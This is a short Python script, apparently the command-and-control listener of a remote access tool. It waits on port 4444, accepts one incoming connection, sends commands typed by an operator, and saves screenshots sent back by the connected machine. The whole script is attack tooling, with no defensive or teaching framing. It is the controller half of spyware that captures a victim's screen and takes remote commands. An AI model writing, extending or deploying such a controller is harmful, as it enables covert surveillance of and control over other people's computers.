import socket

HOST = "srv_ip"
PORT = 4444

def receive_file(conn):
    size = int.from_bytes(conn.recv(4), 'big')
    data = b''
    while len(data) < size:
        packet = conn.recv(4096)
        if not packet:
            break
        data += packet

    with open("received_screenshot.png", "wb") as f:
        f.write(data)
    print("[+] Screenshot saved as received_screenshot.png")

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on port {PORT}...")

conn, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input("Command > ").strip()
    conn.send(cmd.encode())

    if cmd == "screenshot":
        receive_file(conn)
    elif cmd == "exit":
        break

conn.close()
server.close()
